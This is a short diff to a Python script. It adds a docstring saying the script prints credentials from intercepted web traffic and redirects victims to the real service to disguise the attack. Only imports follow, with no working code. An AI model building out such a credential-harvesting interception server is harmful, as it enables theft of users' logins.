@@ -1,4 +1,8 @@
 #!/usr/bin/env python
+'''
+print credentials of intercepted web traffic
+redirect to intended service to disguise attack
+'''
 import http.server
 import SocketServer
 import urllib
